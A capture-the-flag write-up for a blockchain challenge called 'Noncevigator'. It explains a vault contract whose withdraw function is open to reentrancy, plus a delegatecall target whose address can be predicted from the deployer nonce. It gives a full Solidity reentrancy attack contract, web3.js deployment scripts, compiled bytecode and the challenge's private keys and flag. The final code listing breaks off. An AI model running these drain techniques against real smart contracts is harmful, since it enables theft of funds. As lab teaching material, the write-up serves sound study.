## About the Challenge
This is a blockchain challenge. 
Connecting to the service, we are given the ability to create our own challenge instance. 

We are given the rpc endpoint to connect to the network. We are also given a player wallet and a private key. Each player wallet starts off with 10eth, the currency used in smart contracts. We are also given a Challenge Contract Address. 
![UI](/static/writeups/photos/noncevigator.png)


## Understanding the Contracts
We are provided with the Smart Contract source code in a solidity file.

```solidity_retract
pragma solidity ^0.8.19;

contract Noncevigator {

    mapping(string => address) private treasureLocations;
    mapping(string => bool) public isLocationOpen;
    address private travelFundVaultAddr;
    bool isCompassWorking;
    event TeasureLocationReturned(string indexed name, address indexed addr);

    constructor(address hindhedeAddr, address coneyIslandAddr, address pulauSemakauAddr, address tfvAddr) {
        travelFundVaultAddr = tfvAddr;
        treasureLocations["hindhede"] = hindhedeAddr;
        treasureLocations["coneyIsland"] = coneyIslandAddr;
        treasureLocations["pulauSemakau"] = pulauSemakauAddr;
        isLocationOpen["coneyIsland"] = true;
    }

    function getVaultLocation() public view returns (address) {
        return travelFundVaultAddr;
    }

    function getTreasureLocation(string calldata name) public returns (address) {
        address addr = treasureLocations[name];
        emit TeasureLocationReturned(name, addr);

        return addr;
    }

    function startUnlockingGate(string calldata _destination) public {
        require(treasureLocations[_destination] != address(0));
        require(msg.sender.balance >= 170 ether);
        
        (bool success, bytes memory retValue) = treasureLocations[_destination].delegatecall(abi.encodeWithSignature("unlockgate()"));
        require(success, "Denied entry!");
        require(abi.decode(retValue, (bool)), "Cannot unlock gate!");
    }

    function isSolved() external view returns (bool) {
        return isLocationOpen["pulauSemakau"];
    }
}


contract TravelFundvault {

    mapping (address => uint256) private userBalances;

    constructor() payable {
        require(msg.value == 180 ether, "Initial funding of 180 ether required");
    }

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = getUserBalance(msg.sender);
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to withdraw Ether");

        userBalances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }
}
```
There seems to be 2 contracts in this challenge. The *Noncevigator* contract is the main contract, and likely the contract located at the Challenge Contract Address provided.

This *Noncevigator* includes a *isSolved* function. This function checks wheter the *pulauSemakau* key in the *isLocationOpen* map is set to true or not. This seems to be the goal of the challenge, to set this key to be true.

There are also 3 different addresses being stored in the *treasureLocations* map. We will investigate this later. 

The *startUnlockingGate* function takes in a treasure location, and calls a *delegatecall* on the *unlockgate()* at the corresponding treasure location address. The sender needs to have at least 170 ether in order to call the function.

The *getVaultLocation* function likely gives us the location of the *TravelFundVault* Contract.

The *TravelFundVault* Contract seems to be a Standard Bank Contract. 180 ether is funded to the contract, and players can deposit or withdraw ether from the vault using the corresponding *deposit* and *withdraw* functions.

From the challenge description, it seems there are 2 parts to the challenge. We will deal with securing sufficient funds first.

## Setup
I used web3.js to interact with the challenge network. In order to interact with the contracts, we need the contract's *abi*, which is basically the data containing all the functions and variables in the contract. We can input the solidity file into [Remix](https://remix.ethereum.org) to retrieve the *abi*.

We also need the vault's address, so we can call the *getVaultLocation* function in the *Noncevigator* contract to retrieve that.
```javascript_retract
const { Web3 } = require('web3');
var ethJsUtil = require('ethereumjs-util');

// Blockchain info
const uuid = "fee57434-f789-4e3c-8fe4-f028d95c3902";
const rpcEndpoint = `http://chals.tisc24.ctf.sg:47156/${uuid}`;
const privateKey = "0xdf0b813f3186bf010e29968b1c3270c843684aff697deaaee4e8edb3564a8433";
const playerWallet = "0x51ce10Cc3c220e9FA5f717ed5eeF10B106FF749e";
const challengeContractAddress = "0x80cE95C01280d23CB68381826E67776BfdD4A87A";

const web3 = new Web3(rpcEndpoint);
// Define ABI arrays for nonce, travel fund vault, and attack contracts
nonceAbi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "hindhedeAddr",
				"type": "address"
			}, ...
]  

const travelFundVaultAbi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	}, ...
]

const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);

async function getPlayerBalance() {
    let balance = await web3.eth.getBalance(playerWallet);
    console.log(`Player wallet balance: ${web3.utils.fromWei(balance, 'ether')} ETH`);
}

async function getTravelVaultAddress() {
    const vaultAddress = await nonceContract.methods.getVaultLocation().call();
    return vaultAddress;
}

async function main(){
	const vaultAddress = await getTravelVaultAddress()
	console.log(`Vault Address: ${vaultAddress}`)
}

main()
```

## Securing Sufficient Funds For Travel (Reentrancy)
As mentioned above, we need at least 170 ether to call the *startUnlockingGate* function in the *Noncevigator* Contract. We start off with only 10 ether, so we need a way to earn more. The *TravelFundVault* is likely where we earn our ether, since it's the only contract that stores any ether. 

The *deposit* function simply allows us to deposit ether into the vault. The following *withdraw* function is where the magic happens:
```solidity
function withdraw() external {
    uint256 balance = getUserBalance(msg.sender);
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to withdraw Ether");

    userBalances[msg.sender] = 0;
}
```
This function does 3 things
1. Check wheter the user has funds in the vault
2. Withdraws the funds
3. Update the user funds to 0

The main issue to note is the order of execution of these 3 steps. The funds of the user are only updated **after** the funds are withdrawn.

But what happens when we call the withdraw function again, before the funds are updated? Since the funds of the user have yet to be updated, the check will pass, and we will be able to withdraw funds again. This is known as a [Reentrancy Attack](https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts#:~:text=A%20Reentrancy%20Attack%2C%20is%20a,to%20manipulate%20the%20contract%27s%20state.)

Heres a script of a contract we can deploy which accomplishes this:
```solidity_retract
pragma solidity ^0.8.0;

contract Attack {
    address public targetContract;
    address public owner;
    uint public count;

    constructor(address _targetContract) {
        targetContract = _targetContract;
        owner = msg.sender;  // Set the deployer as the owner
    }

    // The receive function handles Ether transfers and triggers reentrancy
    receive() external payable {
        if (address(targetContract).balance >= 1 ether && count < 18) {
            count++;
            (bool success, ) = targetContract.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Reentrancy failed");
        }
    }

    // Fallback function (not needed for this attack)
    fallback() external payable {}

    // Function to initiate the attack
    function attack() external payable {
        count = 0;
        require(msg.value >= 1 ether, "Need to send at least 1 ETH");
        // Deposit Ether into the target contract
        (bool success, ) = targetContract.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Initial deposit failed");

        // Start the withdrawal process, which will trigger the receive() function
        (success, ) = targetContract.call(abi.encodeWithSignature("withdraw()"));
        require(success, "First withdrawal failed");
    }
    // Function to withdraw funds from the attack contract to your wallet
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw funds");
        payable(owner).transfer(address(this).balance);  // Transfer all funds to the owner
    }

    // Check the balance of the attacker contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
When the *attack* function is called, the withdraw function of the vault is called. When the contract receives a request to deposit more ether into the contract, then the *receive* function is called, which triggers an additional *withdraw* request, which happens before the ether in the vault is updated.

To deploy the contract, we need the *bytecode* and the *abi*. We can input the solidity file into [Remix](https://remix.ethereum.org) to retrieve this.

Deploy the code onto the network, call the *attack* function with your available funds, and then withdraw the funds from the contract after the reentrancy is completed. 

**Code**
```javascript_retract
const attack_contract_bytecode = "0x..."
const attackContractAbi =[
	...
]

async function createAttackContract(travelFundVaultAddress) {
    const Expliot = new web3.eth.Contract(attackContractAbi);
    const deploy = Expliot.deploy({
        data: attack_contract_bytecode,
        arguments: [travelFundVaultAddress]
    });
	
    const signedTx = await web3.eth.accounts.signTransaction({
        from: playerWallet,
        data: deploy.encodeABI(),
        gas:5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        nonce: await web3.eth.getTransactionCount(playerWallet),
    }, privateKey);

    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log("Contract deployed at address: ", receipt.contractAddress);
    return receipt.contractAddress;
}

async function exploit() {
    const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);
    const travelFundVaultAddr = await getTravelVaultAddress(nonceContract);
    const travelFundVaultContract = new web3.eth.Contract(travelFundVaultAbi, travelFundVaultAddr);
    const attackAddress = await createAttackContract(travelFundVaultAddr);
    console.log("Attack contract address: ", attackAddress);
    const attackContract = new web3.eth.Contract(attackContractAbi, attackAddress);

    // Build the attack transaction
    const result = await web3.eth.call({
        to: attackAddress,
        data: attackContract.methods.attack().encodeABI(),
        value: web3.utils.toWei('9', 'ether')
    });
    console.log("Attack result: ", result);
    const attackTx = {
        from: playerWallet,
        to: attackAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        value: web3.utils.toWei('9', 'ether'),
        data: attackContract.methods.attack().encodeABI()
    };

    // Sign and send the transaction
    const signedAttackTx = await web3.eth.accounts.signTransaction(attackTx, privateKey);
    console.log(`Signed attack transaction: ${JSON.stringify(signedAttackTx)}`);
    const attackTxHash = await web3.eth.sendSignedTransaction(signedAttackTx.rawTransaction);
    console.log(`Transaction sent with hash: ${attackTxHash.transactionHash}`);

    // Wait for the receipt
    const attackTxReceipt = await web3.eth.getTransactionReceipt(attackTxHash.transactionHash);
    console.log(`Transaction receipt: ${attackTxReceipt}`);

    // Build the withdrawFunds transaction
    const withdrawTx = {
        from: playerWallet,
        to: attackAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        data: attackContract.methods.withdrawFunds().encodeABI()
    };

    // Check the balance before withdrawing
    const balance = await attackContract.methods.getBalance().call();
    console.log(`Attack contract balance: ${balance}`);

    // Sign and send the withdrawFunds transaction
    const signedWithdrawTx = await web3.eth.accounts.signTransaction(withdrawTx, privateKey);
    const withdrawTxHash = await web3.eth.sendSignedTransaction(signedWithdrawTx.rawTransaction);
    console.log(`Transaction sent with hash: ${withdrawTxHash.transactionHash}`);

    // Wait for the receipt
    const withdrawTxReceipt = await web3.eth.getTransactionReceipt(withdrawTxHash.transactionHash);
    console.log(`Transaction receipt: ${withdrawTxReceipt}`);
    getPlayerBalance();

}

```

## Investigating the Treasure
Next, we need to somehow set the "pulauSemakau" key in the *isLocationOpen* to true. This likely has something to do with the *startUnlockingGate* function in the different Treasure Addresses.

Lets investigate the code located at these different treasure addresses:
```javascript
async function getLocationAddress(location){
    const address = await nonceContract.methods.getTreasureLocation(location).call();
	console.log(`Location ${location} address: ${address}`);
    return address;
}
async function getContractBytecode(contractAddress) {
    try {
        // Get the bytecode from the contract address
        const bytecode = await web3.eth.getCode(contractAddress);
        console.log(`Bytecode at ${contractAddress}: ${bytecode}`);
    } catch (error) {
        console.error(`Failed to get bytecode: ${error.message}`);
    }
}

async function investigateAddresses(){
	const treasureLocations = ["hindhede","coneyIsland","pulauSemakau"]
	for (const location of treasureLocations){
		const address = await getLocationAddress(location)
		await getContractBytecode(address)
	}
}
```

**output**
```javascript
Location hindhede address: 0x91624F136d470b1c8b63474ab347e7882eEAdb32
Bytecode at 0x91624F136d470b1c8b63474ab347e7882eEAdb32: 0x
Location coneyIsland address: 0x5b7Ff4f8C9a9BF60Fd88b7Fe8dc6a85fABcC8c13
Bytecode at 0x5b7Ff4f8C9a9BF60Fd88b7Fe8dc6a85fABcC8c13: 0x
Location pulauSemakau address: 0x65a8C50e1e50e7cBae92D2f5466970E9B7aB6f17
Bytecode at 0x65a8C50e1e50e7cBae92D2f5466970E9B7aB6f17: 0x
```
It seems there is no code located at the respective locations. This hints that we might be able to deploy our own contracts at these locations.

The Noncevigator Contract uses the *delegatecall* function. The delegatecall executes the code (specifically the unlockgate function) in the contract called, but within the **context of the Noncevigator**. This means that the code run in contract code will be able to access and edit the main *Noncevigator* contract. This will allow us to edit the *isLocationOpen* map as well.

Thus, the idea is to deploy a contract at one of the 3 addresses, such that when the delegate call function is called, it calls our contract code, which edits the *isLocationOpen* map of the *Noncevigator*, setting the *pulauSemakau* key to *true*.

## Navigating the Nonce
So how do we specify a address to deploy our contract at? Theres no way to specify a address to upload a contract to. **However**, The address it is uploaded to is **not random**. From [this](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761) Stack Exchange, we find that the address actually depends on the **address of the sender**, and the **nonce** value supplied to it. A nonce value is an integer used to differentiate between different transaction, and to ensure that they are in the correct order. Each transaction (including deployment of contracts) should increment this nonce value after each successful transaction. This nonce is likely where the **Noncevigator** part of the challenge name comes into place, likely meaning we are on the right track.

Thus, maybe we can predict the nonce value we need such that our contract is uploaded to one of the three treasure addresses. I've crafted some code to determine the nonce value we need, and which treasure would correspond to that challenge address:
```javascript
async function findNonce(possibleAddress){
	
	const playerWalletBuffer = ethJsUtil.toBuffer(playerWallet);
	for (var nonce = 0;nonce<Math.pow(2,8);nonce++){
		const nonceBuffer = ethJsUtil.toBuffer(nonce);
		var futureAddress = ethJsUtil.bufferToHex(ethJsUtil.generateAddress(
			playerWalletBuffer,
			nonceBuffer)
		);
		for (const [key,value] of Object.entries(possibleAddress)){
			if (value.toLowerCase() == futureAddress.toLowerCase()){
				console.log(`Location: ${key}; Address:${value}; Nonce:${nonce}`)
				return
			}
		}
	}
}
async function investigateAddresses(){
	const treasureLocations = ["hindhede","coneyIsland","pulauSemakau"]
	const treasureAddresses = {}
	for (const location of treasureLocations){
		const address = await getLocationAddress(location)
		treasureAddresses[location] = address
	}
	await findNonce(treasureAddresses)
}
```

We are able to retrieve the correct nonce and location

**output**
```javascript
Location: pulauSemakau; Address:0x65a8C50e1e50e7cBae92D2f5466970E9B7aB6f17; Nonce:48
```

Thus, we can continue deploying contracts to the network until our nonce value is 48. 
```javascript
async function createAttackContract2(nonce) {
	const attackContractAbi2 = [
		...
	]
	const attack_contract_bytecode2 = "..."
	const Expliot = new web3.eth.Contract(attackContractAbi2);
	const deploy = Expliot.deploy({
		data: attack_contract_bytecode2,
	});
	const curNonce = await web3.eth.getTransactionCount(playerWallet)
	// console.log(await web3.eth.getTransactionCount(playerWallet))
	const signedTx = await web3.eth.accounts.signTransaction({
		from: playerWallet,
		data: deploy.encodeABI(),
		gas:5000000,
		gasPrice: web3.utils.toWei('50', 'gwei'),
		nonce: curNonce,
	}, privateKey);
	const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
	console.log("Contract deployed at address: ", receipt.contractAddress);
	if (curNonce >= nonce){
		console.log("Done")
		return true
	}
}

async function createAttackContractWithNonce(nonce){
	for (var i = 0;i<=nonce;i++){
		createAttackContract2(nonce)
        //might crash sometimes
	}
}
createAttackContractWithNonce(48)
```

After successfully creating our contract at the specified address, we can then call the unlockGate function:
```javascript
async function unlockGate(place) {
    const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);
    const unlockTx = {
        from: playerWallet,
        to: challengeContractAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        data: nonceContract.methods.startUnlockingGate(place).encodeABI()
    };

    // Sign and send the transaction
    const signedUnlockTx = await web3.eth.accounts.signTransaction(unlockTx, privateKey);
    console.log(`Signed attack transaction: ${JSON.stringify(signedUnlockTx)}`);
    const unlockTxHash = await web3.eth.sendSignedTransaction(signedUnlockTx.rawTransaction);
    console.log(`Transaction sent with hash: ${unlockTxHash.transactionHash}`);

    // Wait for the receipt
    const attackTxReceipt = await web3.eth.getTransactionReceipt(unlockTxHash.transactionHash);
    console.log(`Transaction receipt: ${attackTxReceipt}`);
}
unlockGate("pulauSemakau")
```

No error is returned, so we can use the service to check wheter our attack was successful

## Flag
![Flag](/static/writeups/photos/noncevigator2.png)
```text
TISC{ReeN7r4NCY_4ND_deTerminI5TIc_aDDReSs}
```
## Full Code
```javascript_RETRACT
const { Web3 } = require('web3');
var ethJsUtil = require('ethereumjs-util');

// Blockchain info
const uuid = "246464e7-c4e5-43f1-9444-741ddc67937a";
const rpcEndpoint = `http://chals.tisc24.ctf.sg:47156/${uuid}`;
const privateKey = "0x9230e99e67c61a83c2b179420124eedb805f173dfe1f7cc6dca8fd161c87eac6";
const playerWallet = "0x729F61e8B3CE9775DF5c9388Dbba45F1014154Ef";
const challengeContractAddress = "0x4eA57dDc72f3728Db081635b5115D8475aC0E63E";

const web3 = new Web3(rpcEndpoint);
// Define ABI arrays for nonce, travel fund vault, and attack contracts
nonceAbi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "hindhedeAddr",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "coneyIslandAddr",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "pulauSemakauAddr",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "tfvAddr",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "string",
				"name": "name",
				"type": "string"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "addr",
				"type": "address"
			}
		],
		"name": "TeasureLocationReturned",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "name",
				"type": "string"
			}
		],
		"name": "getTreasureLocation",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getVaultLocation",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"name": "isLocationOpen",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "_destination",
				"type": "string"
			}
		],
		"name": "startUnlockingGate",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]  

const travelFundVaultAbi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_user",
				"type": "address"
			}
		],
		"name": "getUserBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
const attack_contract_bytecode = "0x608060405234801561000f575f80fd5b50604051610c16380380610c1683398181016040528101906100319190610114565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f80fd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b610aca8061014c5f395ff3fe608060405260043610610058575f3560e01c806306661abd1461021957806312065fe01461024357806324600fc31461026d5780638da5cb5b146102835780639e5faafc146102ad578063bd90df70146102b757610217565b3661021757670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100ad5750600a600254105b156102155760025f8154809291906100c49061074d565b91905055505f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161019191906107e6565b5f604051808303815f865af19150503d805f81146101ca576040519150601f19603f3d011682016040523d82523d5f602084013e6101cf565b606091505b5050905080610213576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161020a90610856565b60405180910390fd5b505b005b005b348015610224575f80fd5b5061022d6102e1565b60405161023a9190610883565b60405180910390f35b34801561024e575f80fd5b506102576102e7565b6040516102649190610883565b60405180910390f35b348015610278575f80fd5b506102816102ee565b005b34801561028e575f80fd5b506102976103e4565b6040516102a491906108db565b60405180910390f35b6102b5610409565b005b3480156102c2575f80fd5b506102cb6106f4565b6040516102d891906108db565b60405180910390f35b60025481565b5f47905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461037d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103749061093e565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f193505050501580156103e1573d5f803e3d5ffd5b50565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f600281905550670de0b6b3a764000034101561045b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610452906109a6565b60405180910390fd5b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16346040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161052491906107e6565b5f6040518083038185875af1925050503d805f811461055e576040519150601f19603f3d011682016040523d82523d5f602084013e610563565b606091505b50509050806105a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161059e90610a0e565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161066d91906107e6565b5f604051808303815f865af19150503d805f81146106a6576040519150601f19603f3d011682016040523d82523d5f602084013e6106ab565b606091505b505080915050806106f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106e890610a76565b60405180910390fd5b50565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f61075782610744565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361078957610788610717565b5b600182019050919050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6107c082610794565b6107ca818561079e565b93506107da8185602086016107a8565b80840191505092915050565b5f6107f182846107b6565b915081905092915050565b5f82825260208201905092915050565b7f5265656e7472616e6379206661696c65640000000000000000000000000000005f82015250565b5f6108406011836107fc565b915061084b8261080c565b602082019050919050565b5f6020820190508181035f83015261086d81610834565b9050919050565b61087d81610744565b82525050565b5f6020820190506108965f830184610874565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6108c58261089c565b9050919050565b6108d5816108bb565b82525050565b5f6020820190506108ee5f8301846108cc565b92915050565b7f4f6e6c79206f776e65722063616e2077697468647261772066756e64730000005f82015250565b5f610928601d836107fc565b9150610933826108f4565b602082019050919050565b5f6020820190508181035f8301526109558161091c565b9050919050565b7f4e65656420746f2073656e64206174206c6561737420312045544800000000005f82015250565b5f610990601b836107fc565b915061099b8261095c565b602082019050919050565b5f6020820190508181035f8301526109bd81610984565b9050919050565b7f496e697469616c206465706f736974206661696c6564000000000000000000005f82015250565b5f6109f86016836107fc565b9150610a03826109c4565b602082019050919050565b5f6020820190508181035f830152610a25816109ec565b9050919050565b7f4669727374207769746864726177616c206661696c65640000000000000000005f82015250565b5f610a606017836107fc565b9150610a6b82610a2c565b602082019050919050565b5f6020820190508181035f830152610a8d81610a54565b905091905056fea26469706673582212201c3f726b6243fb929cf88e2b4f16fafb355bd2f34232cd82a27113590488659664736f6c634300081a0033"
const attackContractAbi =[
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_targetContract",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "fallback"
	},
	{
		"inputs": [],
		"name": "attack",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "count",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetContract",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "withdrawFunds",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	}
]


// Load the contract
const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);

// Get player wallet balance
async function getPlayerBalance() {
    let balance = await web3.eth.getBalance(playerWallet);
    console.log(`Player wallet balance: ${web3.utils.fromWei(balance, 'ether')} ETH`);
}
async function createAttackContract2(nonce) {
	const attackContractAbi2 = [
		{
			"inputs": [],
			"name": "unlockgate",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
	const attack_contract_bytecode2 = "0x6080604052348015600e575f80fd5b5061018e8061001c5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063b27399d51461002d575b5f80fd5b61003561004b565b604051610042919061009d565b60405180910390f35b5f80600160405160200161005f9190610133565b60405160208183030381529060405280519060200120905060018155600191505090565b5f8115159050919050565b61009781610083565b82525050565b5f6020820190506100b05f83018461008e565b92915050565b5f81905092915050565b7f70756c617553656d616b617500000000000000000000000000000000000000005f82015250565b5f6100f4600c836100b6565b91506100ff826100c0565b600c82019050919050565b5f819050919050565b5f819050919050565b61012d6101288261010a565b610113565b82525050565b5f61013d826100e8565b9150610149828461011c565b6020820191508190509291505056fea2646970667358221220ecf264aee0faaf1adf9e232076145744e528d0d29033587e311be278c09750f164736f6c634300081a0033"
	const Expliot = new web3.eth.Contract(attackContractAbi2);
	const deploy = Expliot.deploy({
		data: attack_contract_bytecode2,
	});
	const curNonce = await web3.eth.getTransactionCount(playerWallet)
	// console.log(await web3.eth.getTransactionCount(playerWallet))
	const signedTx = await web3.eth.accounts.signTransaction({
		from: playerWallet,
		data: deploy.encodeABI(),
		gas:5000000,
		gasPrice: web3.utils.toWei('50', 'gwei'),
		nonce: curNonce,
	}, privateKey);
	console.log(curNonce)
	const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
	console.log("Contract deployed at address: ", receipt.contractAddress);
	if (curNonce >= nonce){
		console.log("Done")
		return true
	}
}

// Function to create an attack contract
async function createAttackContract(travelFundVaultAddress) {
    const Expliot = new web3.eth.Contract(attackContractAbi);
    const deploy = Expliot.deploy({
        data: attack_contract_bytecode,
        arguments: [travelFundVaultAddress]
    });
	
    const gas = 5000000;
    const signedTx = await web3.eth.accounts.signTransaction({
        from: playerWallet,
        data: deploy.encodeABI(),
        gas:5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        nonce: await web3.eth.getTransactionCount(playerWallet),
    }, privateKey);

    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log("Contract deployed at address: ", receipt.contractAddress);
    return receipt.contractAddress;
}

// Function to get the travel vault address
async function getTravelVaultAddress() {
    const vaultAddress = await nonceContract.methods.getVaultLocation().call();
    return vaultAddress;
}


// Function to unlock the gate
async function unlockGate(place) {
    const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);
    const unlockTx = {
        from: playerWallet,
        to: challengeContractAddress,
        nonce: await web3.eth.getTransactionCount(playerWallet),
        gas: 5000000,
        gasPrice: web3.utils.toWei('50', 'gwei'),
        data: nonceContract.methods.startUnlockingGate(place).encodeABI()
    };

    // Sign and send the transaction
    const signedUnlockTx = await web3.eth.accounts.signTransaction(unlockTx, privateKey);
    console.log(`Signed attack transaction: ${JSON.stringify(signedUnlockTx)}`);
    const unlockTxHash = await web3.eth.sendSignedTransaction(signedUnlockTx.rawTransaction);
    console.log(`Transaction sent with hash: ${unlockTxHash.transactionHash}`);

    // Wait for the receipt
    const attackTxReceipt = await web3.eth.getTransactionReceipt(unlockTxHash.transactionHash);
    console.log(`Transaction receipt: ${attackTxReceipt}`);

    

}

async function getLocationAddress(location){
    const address = await nonceContract.methods.getTreasureLocation(location).call();
	console.log(`Location ${location} address: ${address}`);
    return address;
}
async function exploit() {
    const nonceContract = new web3.eth.Contract(nonceAbi, challengeContractAddress);
    const travelFundVaultAddr = await getTravelVaultAddress(nonceContract);
